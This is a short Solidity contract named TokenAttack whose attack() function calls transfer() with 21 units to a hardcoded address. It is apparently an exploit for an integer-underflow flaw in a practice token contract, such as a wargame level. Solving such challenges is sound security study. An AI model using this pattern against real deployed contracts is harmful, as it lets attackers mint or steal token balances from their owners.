// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface Token
{
    function transfer(address _to, uint _value) external returns (bool);
}

contract TokenAttack
{
    Token immutable tokenaddress;

    constructor(address _tokenaddress)
    {
        tokenaddress = Token(_tokenaddress);
    }

    function attack() external 
    {
        tokenaddress.transfer(0x6633582BE61552de02103EECeDB806735fA021be,21);
    }
}
